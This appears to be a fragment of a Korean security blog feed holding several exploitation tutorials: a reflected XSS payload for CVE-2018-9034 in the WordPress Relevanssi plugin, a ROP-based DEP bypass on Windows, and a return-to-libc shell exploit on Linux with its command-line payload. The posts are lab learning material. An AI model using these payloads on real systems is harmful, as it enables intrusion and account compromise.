&lt;h2 id=&quot;references-참고-문헌&quot;&gt;References 참고 문헌&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html&lt;/li&gt;
  &lt;li&gt;https://brauner.github.io/2019/02/12/privileged-containers.html&lt;/li&gt;
  &lt;li&gt;https://www.helpnetsecurity.com/2019/02/12/runc-container-escape-flaw/&lt;/li&gt;
  &lt;li&gt;https://kubernetes.io/blog/2019/02/11/runc-and-cve-2019-5736/&lt;/li&gt;
  &lt;li&gt;https://vulmon.com/exploitdetails?qidtp=EDB&amp;amp;qid=46369&lt;/li&gt;
  &lt;li&gt;https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d&lt;/li&gt;
  &lt;li&gt;https://github.com/rancher/runc-cve&lt;/li&gt;
  &lt;li&gt;https://github.com/Frichetten/CVE-2019-5736-PoC&lt;/li&gt;
  &lt;li&gt;https://subicura.com/2017/01/19/docker-guide-for-beginners-1.html&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Sulla</name></author><category term="Posts" /><summary type="html">CVE-2019-5736 (runC Container 취약점)</summary></entry><entry><title type="html">web-0x03</title><link href="http://localhost:4000/web-0x03" rel="alternate" type="text/html" title="web-0x03" /><published>2019-03-25T14:00:00+09:00</published><updated>2019-03-25T14:00:00+09:00</updated><id>http://localhost:4000/web-0x03</id><content type="html" xml:base="http://localhost:4000/web-0x03">&lt;h1 id=&quot;cve-2018-9034-1day-test&quot;&gt;CVE-2018-9034 1Day Test&lt;/h1&gt;

&lt;p&gt;안녕하세요 hackyu입니다.&lt;/p&gt;

&lt;p&gt;오늘은 Wordpress 환경에서의 검색 기능을 제공하는 Relevanssi Search Plugin 4.0.4 이전버전(Version 4.0.4 포함)에서 발생한 CVE-2018-9034 XSS(Cross Site Scripting - Reflected) 취약점에 대한 포스팅입니다.&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;취약점-분석&quot;&gt;취약점 분석&lt;/h5&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;환경구성&lt;/strong&gt;&lt;br /&gt;
    &lt;ul&gt;
      &lt;li&gt;Apache 2.4.18&lt;br /&gt;&lt;/li&gt;
      &lt;li&gt;PHP 7.0.30&lt;br /&gt;&lt;/li&gt;
      &lt;li&gt;Wordpress 4.9.4&lt;br /&gt;&lt;/li&gt;
      &lt;li&gt;Wordpress Relevanssi Search Plugin 4.0.4&lt;br /&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x03_1.png&quot; /&gt;
  &lt;figcaption&gt;&lt;center&gt;  
   - CVE-2018-9034 Flow -
  &lt;/center&gt;&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;다음은 취약점이 발생한 Relevanssi Search Plugin lib/interface.php를 확인해보면, tab 파라미터에 스크립트를 삽입하여 요청하는 경우 취약점이 발생이 가능한 것을 확인할 수 있습니다.&lt;br /&gt;&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x03_2.png&quot; /&gt;
  &lt;figcaption&gt;&lt;center&gt;  
   - relevanssi.php -
  &lt;/center&gt;&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x03_3.png&quot; /&gt;
  &lt;figcaption&gt;&lt;center&gt;  
   - interface.php -
  &lt;/center&gt;&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;취약점-공격-테스트&quot;&gt;취약점 공격 테스트&lt;/h5&gt;
&lt;p&gt;제일 기본적으로 스크립트가 정상적으로 구동이 되는지
&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;alert('TEST');&amp;lt;/script&amp;gt;&lt;/code&gt;를 tab 파라미터로 요청한 결과로 스크립트가 구동되지 않고, 기본적으로 스크립트에 사용될 수 있는 ‘, “ 등 Escape 문자인 경우 ‘'가 붙어 응답되어 스크립트가 정상적으로 구동되지 않았고, 스크립트 삽입 시 Escape문자를 사용할 수 없는 것을 확인할 수 있습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x03_4.png&quot; /&gt;
  &lt;figcaption&gt;&lt;center&gt;  
   - XSS 구문 삽입 테스트 Escape문자로 인해 실행되지 않음 -
  &lt;/center&gt;&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Escape 문자를 사용할 수 없는 경우 다음과 그림과 같이 Javascript의 substring(), String()를 이용하여 ‘/’(인덱스 start, end)를 제외한 문자열을 다시 변수 x에 대입하여 원하는 문자열을 이용하여 스크립트를 사용할 수 있습니다.&lt;/p&gt;
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x03_5.png&quot; /&gt;
  &lt;figcaption&gt;&lt;center&gt;  
   - Javascript 테스트 -
  &lt;/center&gt;&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;공격 시 사용되는 tab 파라미터를 통한 Payload는 다음과 같습니다.&lt;/p&gt;
&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;nx&quot;&gt;Server&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;wordpress&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;wp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;admin&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;general&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;page&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;relevanssi&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;relevanssi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tab&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'&amp;gt;&amp;lt;script&amp;gt;var x = String(/hackyu CVE-2018-9034 TEST/);x = x.substring(1, x.length-1);alert(x)&amp;lt;/script&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;위의 Payload를 이용하여 다음과 같이 정상적으로 스크립트가 실행되는 것을 확인할 수 있습니다.&lt;/p&gt;
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x03_6.png&quot; /&gt;
  &lt;figcaption&gt;&lt;center&gt;  
   - XSS 시도 및 결과  -
  &lt;/center&gt;&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;패치 및 대응방안&lt;/strong&gt;
&lt;br /&gt;
-Update to version
&lt;br /&gt;&lt;br /&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x03_7.png&quot; /&gt;
  &lt;figcaption&gt;&lt;center&gt;  
   - Relevanssi Version 4.0.4(좌), 4.0.5(우) -
  &lt;/center&gt;&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;References&lt;/strong&gt;
&lt;br /&gt;
https://www.exploit-db.com/exploits/44366&lt;br /&gt;
https://ppbuz.com/8644&lt;br /&gt;
https://nvd.nist.gov/vuln/detail/CVE-2018-9034&lt;br /&gt;
https://pluginarchive.com/wordpress/relevanssi/v/4-0-4&lt;br /&gt;
https://downloads.wordpress.org/plugin/relevanssi.4.0.4.zip&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Hackyu</name></author><category term="Posts" /><summary type="html">CVE-2018-9034 1Day Test</summary></entry><entry><title type="html">windows-0x09</title><link href="http://localhost:4000/windows-0x09" rel="alternate" type="text/html" title="windows-0x09" /><published>2019-03-24T20:18:00+09:00</published><updated>2019-03-24T20:18:00+09:00</updated><id>http://localhost:4000/windows-0x09</id><content type="html" xml:base="http://localhost:4000/windows-0x09">&lt;h1 id=&quot;0x09-dep3&quot;&gt;0x09 DEP(3)&lt;/h1&gt;

&lt;p&gt;이번 시간에는 DEP의 마지막 주제인 ROP에 대해서 알아보도록 하겠습니다.&lt;/p&gt;

&lt;h5 id=&quot;rop-return-oriented-programming&quot;&gt;ROP (Return Oriented Programming)&lt;/h5&gt;

&lt;p&gt;ROP는 Gadget으로 Chain을 구성하여 API를 호출하는 방식의 공격 기법입니다.&lt;/p&gt;

&lt;p&gt;주로 VirtualProtect()나 SetProcessDEPPolicy() 등 메모리와 관련된 함수들을 호출하며,&lt;/p&gt;

&lt;p&gt;Shellcode를 실행할 수 있도록 실행 권한을 추가하는 방향으로 진행됩니다.&lt;/p&gt;

&lt;p&gt;이번 연재에서는 가장 흔하고 쉬운 방식인 VirtualProtect() API를 호출해서 DEP를 우회하도록 하겠습니다.&lt;/p&gt;

&lt;h6 id=&quot;virtualprotect-함수&quot;&gt;VirtualProtect 함수&lt;/h6&gt;

&lt;p&gt;VirtualProtect는 4개의 인자를 가지며, 특정 메모리 영역의 실행 권한을 변경해주는 함수입니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;BOOL WINAPI VirtualProtect (
		_In_ LPVOID lpAddress, 		 # 권한을 변경할 메모리 영역의 시작 주소
		_In_ SIZE_T dwSize,	   		 # 변경할 크기
		_In_ flNewProtect,     		 # 변경할 속성 값
		_Out_ PDWORD lpflOldProtect, # 이전 값 저장 (쓰기 가능한 영역)
	);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;VirtualProtect 함수는 변경을 원하는 메모리 영역의 시작 주소를 기준으로 원하는 크기만큼 실행 권한을 변경해줍니다.&lt;/p&gt;

&lt;p&gt;그럼 ShellCode를 넣어둔 뒤, 그 크기만큼 실행 권한을 주면 되겠네요.&lt;/p&gt;

&lt;p&gt;이 내용을 STACK으로 구성하면 다음과 같습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x09_1.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;그림처럼 STACK을 구성할 경우, VirtualProtect()가 호출되어 ShellCode가 들어있는 메모리 주소에 실행 권한이 생길 것이고,&lt;/p&gt;

&lt;p&gt;다음 RET에서 JMP ESP가 호출되어 ShellCode가 실행될 것 입니다.&lt;/p&gt;

&lt;p&gt;그리고 이 모양의 STACK을 구성하기 위해 PUSHAD 명령어를 이용할 것 입니다. STACK 구성이 좀 더 쉽겠죠?&lt;/p&gt;

&lt;h5 id=&quot;payload-구성&quot;&gt;PAYLOAD 구성&lt;/h5&gt;

&lt;p&gt;Mona.py를 이용해서 ROP Chain 구성에 사용할 Gadget들을 찾아 보겠습니다. ( !mona modules )&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x09_2.png&quot; alt=&quot;[그림 1-2]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;Gadget은 위의 Module들 중에 ASLR이 적용되어 있지 않은 example.dll에서 가져다 쓰면 되겠네요.&lt;/p&gt;

&lt;p&gt;이제 여기서 Gadget을 구해서 값들을 맞춰주기만 하면 되는데,,, 일일이 하나씩 찾아서 넣으면 엄청나게 많은 시간이 소요되겠죠??&lt;/p&gt;

&lt;p&gt;하나하나 다 찾아다닐 시간은 없으니까 mona.py에서 제공하는 기능을 활용하겠습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;!mona rop -m example
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;이 명령어를 사용하면 mona.py에서 자동으로 rop 공격에 필요한 Gadget들을 example.dll에서 찾아 파일로 생성해줍니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x09_3.png&quot; alt=&quot;[그림 1-3]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;여러 언어에 맞게 추천을 해주는데 여러분 환경에 맞는 값을 사용하시면 됩니다.&lt;/p&gt;

&lt;p&gt;이제 필요한 Gadget들을 아주 손쉽게 찾아왔는데 한 가지 생각해야 할 점이 있습니다.&lt;/p&gt;

&lt;p&gt;바로 VirtualProtect의 함수 주소입니다.&lt;/p&gt;

&lt;p&gt;ASLR이 적용되어 있으면 Window API 함수들의 주소도 계속해서 변할텐데 어떻게 주소를 가지고 올 수 있는 걸까요?&lt;/p&gt;

&lt;p&gt;Gadget 파일을 잘 보시면 VirtualProtect에 IAT라고 적혀있는 것을 보실 수 있을 겁니다.&lt;/p&gt;

&lt;p&gt;IAT(Import Address Table)는 프로그램에서 사용되는 라이브러리에서 어떤 함수들을 사용하고 있는지, 그 함수들의 정보를 기술한 테이블입니다.&lt;/p&gt;

&lt;p&gt;아래와 같이 example.dll의 IAT를 살펴보면 우리가 사용하고자 하는 VirtualProtect() 함수의 정보가 들어있는 것을 확인하실 수 있습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x09_4.png&quot; alt=&quot;[그림 1-4]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;이렇게 VirtualProtect() 정보가 들어 있는 경우에는 IAT 값에서 시작 주소를 가져다가 쓰면 되는 것이죠.&lt;/p&gt;

&lt;p&gt;없다면? 동적으로 찾아오도록 Gadget을 구성하면 됩니다.&lt;/p&gt;

&lt;h5 id=&quot;null-byte-제거&quot;&gt;Null Byte 제거&lt;/h5&gt;

&lt;p&gt;공격을 성공적으로 하기 위해 Payload에 존재하는 Null Byte들을 제거해줘야겠죠?&lt;/p&gt;

&lt;p&gt;mona가 만들어 준 값들엔 Null Byte가 존재해서 Payload 전달이 완전하게 이루어지지 않는답니다.&lt;/p&gt;

&lt;p&gt;그래서 다음과 같이 수정을 했습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x09_5.png&quot; alt=&quot;[그림 1-5]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;먼저, 0x201, 0x40 같은 값을 넣어줘야 하는데 Null이 존재하므로 0xfffffdff, 0xffffffc0를 넣고 neg를 사용해서 값을 생성해줬습니다.&lt;/p&gt;

&lt;p&gt;그리고 Gadget 주소 중에 Null이 존재하는 것은 다른 Gadget 찾아서 교체해준 내용입니다.&lt;/p&gt;

&lt;p&gt;mona만 믿고 Payload를 구성하시면 안됩니다. 잘 살펴보고 Null은 반드시 제거해주셔야 합니다.&lt;/p&gt;

&lt;p&gt;이어서 DBG로 살펴보면 다음과 같습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x09_6.png&quot; alt=&quot;[그림 1-6]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;strcpy가 실행되고 나서의 모습입니다. 각 Gadget들이 연속해서 실행된 뒤, VirtualProtect() 함수가 실행될 것이고,&lt;/p&gt;

&lt;p&gt;마지막에 JMP ESP가 실행되면서 ShellCode가 실행되겠네요.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x09_7.png&quot; alt=&quot;[그림 1-7]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;잘 실행되네요^^&lt;/p&gt;

&lt;p&gt;지금까지 DEP에 대해서 알아봤습니다.&lt;/p&gt;

&lt;p&gt;다음 연재부터는 Heap Exploit으로 찾아뵙도록 하겠습니다.&lt;/p&gt;</content><author><name>Joel Park</name></author><category term="Posts" /><summary type="html">0x09 DEP(3)</summary></entry><entry><title type="html">linux_0x04</title><link href="http://localhost:4000/linux_0x04" rel="alternate" type="text/html" title="linux_0x04" /><published>2019-03-24T15:18:00+09:00</published><updated>2019-03-24T15:18:00+09:00</updated><id>http://localhost:4000/linux_0x04</id><content type="html" xml:base="http://localhost:4000/linux_0x04">&lt;h2 id=&quot;rtlreturn-to-library&quot;&gt;RTL(Return to Library)&lt;/h2&gt;

&lt;p&gt;안녕하세요. &lt;strong&gt;Sulla&lt;/strong&gt;입니다!&lt;/p&gt;

&lt;p&gt;이번에 알아볼 내용은 &lt;strong&gt;RTL&lt;/strong&gt;(Return to Library)입니다.
먼저 &lt;strong&gt;RTL&lt;/strong&gt;이 뭔지를 알아보도록 하겠습니다.&lt;/p&gt;

&lt;h1 id=&quot;rtlreturn-to-library-1&quot;&gt;RTL(Return to Library)&lt;/h1&gt;

&lt;p&gt;지난 포스팅에서 &lt;strong&gt;메모리 보호 기법&lt;/strong&gt;에 대해 간단하게 봤습니다. 그 중 &lt;strong&gt;ASLR&lt;/strong&gt;은 봤고 &lt;strong&gt;DEP/NX bit&lt;/strong&gt;는 언급만 하고 넘어갔었죠. &lt;strong&gt;메모리 내부에서 코드실행을 방지&lt;/strong&gt;하기 위한 메모리 보호 기법 중 하나라고 알려 드렸습니다.&lt;/p&gt;

&lt;p&gt;메모리에서의 코드 실행이 막혔기 때문에(Shellcode 실행 차단) 다른 방법을 찾아야 합니다. &lt;strong&gt;/bin/sh&lt;/strong&gt; 를 직접 실행할 수 있다면 가능할 듯 합니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-1.png&quot; alt=&quot;[그림 4-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;그럼 어떻게 해야할까요? 첫 포스팅에서 메모리 구조를 설명 드릴 때 위 그림을 보여 드렸었습니다.&lt;strong&gt;[스택 -&lt;/strong&gt; &lt;strong&gt;공유라이브러리 -&lt;/strong&gt; &lt;strong&gt;힙 - BSS/Data - Code]&lt;/strong&gt;으로 이뤄지며, 공유 라이브러리는 &lt;strong&gt;메모리에 미리 필요한 중요 함수들을 저장해두는 장소&lt;/strong&gt;라고 간단하게 설명 드렸었죠.
저 &lt;strong&gt;공유 라이브러리&lt;/strong&gt;를 사용하여 &lt;strong&gt;/bin/sh&lt;/strong&gt;을 실행할 수 있지 않을까???라는 생각으로 &lt;strong&gt;RTL&lt;/strong&gt;이 연구되었다 생각되네요….(&lt;strong&gt;뇌피셜)&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;공유 라이버르러리를 간단하게 정리하자면 다음과 같습니다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;여러 프로세스에서 동시에 사용 가능한 라이브러리&lt;/li&gt;
  &lt;li&gt;프로그램이 시작될 때 메모리에 적재됨&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;우리는 저 &lt;strong&gt;공유 라이브러리&lt;/strong&gt; 중에서 &lt;strong&gt;system()&lt;/strong&gt; 함수를 사용하겠습니다. 해당 함수는 입력받은 문자열을 실행시키는 함수입니다. 즉, 인자값으로 &lt;strong&gt;/bin/sh&lt;/strong&gt; 를 입력한다면 &lt;strong&gt;system(“/bin/sh”);&lt;/strong&gt;과 같은 형태가 되며 &lt;strong&gt;system()&lt;/strong&gt;이 &lt;strong&gt;/bin/sh&lt;/strong&gt;를 실행하게 됩니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-2.png&quot; alt=&quot;[그림 4-2]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;RTL&lt;/strong&gt;의 흐름을 위와 같이 표현했습니다. &lt;strong&gt;libc&lt;/strong&gt;(공유라이브러리)의 함수(&lt;strong&gt;system()&lt;/strong&gt;)를 사용해서 &lt;strong&gt;8byte&lt;/strong&gt; 뒤에 &lt;strong&gt;/bin/sh&lt;/strong&gt; 의 주소를 박아두면 &lt;strong&gt;system()&lt;/strong&gt;이 &lt;strong&gt;/bin/sh&lt;/strong&gt; 를 실행하여 &lt;strong&gt;shell&lt;/strong&gt;을 따내게 됩니다. 
즉, &lt;strong&gt;버퍼 + sfp + system() + AAAA + /bin/sh&lt;/strong&gt; 처럼 표현 가능할 듯 합니다.&lt;/p&gt;

&lt;p&gt;여기서 왜 &lt;strong&gt;system()&lt;/strong&gt; 뒤에 인자값으로 바로 &lt;strong&gt;/bin/sh/&lt;/strong&gt;가 아닌 잉여값 “&lt;strong&gt;AAAA&lt;/strong&gt;“을 입력할까요? 그냥 바로 인자값을 입력하면 인식을 못할까요?&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-3.png&quot; alt=&quot;[그림 4-3]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;system(“/bin/sh”)&lt;/strong&gt; 이 입력된 상태에서 함수가 종료되면 에필로그 과정을 가집니다. 에필로그 과정 중 ret(pop eip) 과정을 거치며 system() 함수의 주소를 eip에  옮기게 되죠. 이 과정에 pop 명령을 사용 했기에 스택에 공간이 생깁니다.(가운데) 그런 다음 system() 함수의 프롤로그 과정을 가지며 push ebp, mov ebp, esp 과정을 거치며 새롭게 메모리의 영역을 확보하죠. 
즉, AAAA의 위치는 system 함수가 끝난 뒤의 ret 구역이 되며 잉여값을 배치해주고, 다음 공간에 원하는 주소값을 위치시켜 줍니다. 좀더 확실하게 알아보도록 하죠. (참고로 root로 생성된 실행파일은 디버깅이 안되니 /tmp/ 하위에 다른 폴더로 복사해서 분석해주세요!!)&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-4.png&quot; alt=&quot;[그림 4-4]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;위 사진에서와 같이 system() 내부를 들여다 보면 프로로그 과정을 거치고 EBP에서 8byte 떨어진 주소를 참조합니다. EBP에서 4byte를 가지고 우리는 남은 4byte만(RET) 채워준 뒤 원하는 주소를 입력해준다면 인자값을 정상적으로 인식하게 됩니다.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Return to Library&lt;/strong&gt;라는 이름을 아주 성실하게 이행하는 모습이네요. 그럼 직접 시작해보곘습니다. 먼저 찾아야 할 주소는 아래와 같습니다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;system()&lt;/strong&gt; 주소 = ????&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;/bin/sh&lt;/strong&gt; 주소 = ????&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;1번 system 주소부터 확인 하도록 하겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-5.png&quot; alt=&quot;[그림 4-5]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;먼저 브레이크를 main 함수에 잡아주고 구동 시킵니다.bp에 멈추고 나면 print 명령을 사용해 system()의 주소를 확인 하시면 됩니다.(system의 주소를 못 찾는 심볼을 찾을수 없다는 에러가 뜨는 경우 static 옵션을 뺴고 컴파일 해주세요….개고생 했습니다…..)&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;system()&lt;/strong&gt; 주소 = &lt;strong&gt;0x4203f2c0&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;/bin/sh&lt;/strong&gt; 주소 = ????&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;이제 /bin/sh의 주소를 구해야 합니다. 실제로는 /lib/libc.so.6 라이브러리 파일 내의 /bin/sh와 system 의 오프셋을 구해서 최종적인 문자열 주소를 찾을수 있지만 아래의 반복문을 통해서 쉽게 구해보겠습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;01 #include &amp;lt;stdio.h&amp;gt;
02 
03 int main(){
04   long shell=0x4203f2c0; //system()의 주소를 입력해 주시면 됩니다.
05 	 while(memcmp((void*)shell,(&quot;/bin/sh&quot;),8))
06   shell++; 
07 	 printf(&quot;%p\n&quot;,shell);
08 }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;코드의 중요 라인인 5라인만 설명 드리자면 &lt;strong&gt;memcmp&lt;/strong&gt; 함수를 사용해서 &lt;strong&gt;바이트 데이터를 비교&lt;/strong&gt; 하는 과정입니다. &lt;strong&gt;memcmp(인자1, 인자2, 사이즈)&lt;/strong&gt;의 기본형을 가지며 &lt;strong&gt;인자 1&lt;/strong&gt;의 첫 바이트와 &lt;strong&gt;인자 2&lt;/strong&gt;의 첫 바이트를 &lt;strong&gt;사이즈&lt;/strong&gt; 만큼 비교하는 것이며, 이 과정을 통해서 &lt;strong&gt;system()내부에 /bin/sh 문자열을&lt;/strong&gt; 찾아내며 결과적으로 &lt;strong&gt;주소값으로 리턴&lt;/strong&gt; 해줍니다. 돌려줍시다~&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-6.png&quot; alt=&quot;[그림 4-6]&quot; /&gt;
&lt;/figure&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;system()&lt;/strong&gt; 주소 = &lt;strong&gt;0x4203f2c0&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;/bin/sh&lt;/strong&gt; 주소 = &lt;strong&gt;0x42127ea4&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;최종적으로 system() 과 /bin/sh 의 주소값을 찾아냈습니다. 이제 찾아낸 정보를 바탕으로 공격 페이로드를 작성해 보겠습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./bof1 `python -c 'print &quot;AAAA&quot;*11 + &quot;\xc0\xf2\x03\x42&quot; + &quot;AAAA&quot; + &quot;\xa4\x7e\x12\x42&quot;'`
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;마지막으로 페이로드를 정리 하고 직접 때려보도록 하겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-7.png&quot; alt=&quot;[그림 4-7]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;먼저 버버 크기(40byte)와 sfp(4byte) 를 채워 주고 공유 라이브러리에 위치한 system() 함수를 저장시킵니다. 다음 위치에는 AAAA의 4byte를 채워 줍니다. 이유는 위에서 알려 드렸듯 system()의 인자값은 8byte 뒤에 위치하기에 그 거리만큼 벌려 주고 우리가 필요로 하는 /bin/sh을 위치 시켜 줌으로서 system()이 인자값으로 /bin/sh을 정상적으로 받을수 있게 설계해준겁니다.&lt;/p&gt;

&lt;p&gt;설명은 이쯤 해두고 직접 떄려보도록 하겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-8.png&quot; alt=&quot;[그림 4-8]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;shell이 떨어지네요. 지금 한 방식처럼 system() 내부의 /bin/sh 문자열을 찾는 방법도 있고 전 포스팅에서 했던 환경변수를 이용 하는 방법도 있습니다. 빠르게 보고 넘어가죠.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-9.png&quot; alt=&quot;[그림 4-9]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;위에서 설명 드렸듯 bof라는 환경변수에 /bin/sh 문자열을 저장하고 해당 환경변수의 주소를 확인합니다. 아래쪽은 bof 환경변수의 동작 여부를 확인 했습니다.&lt;/p&gt;

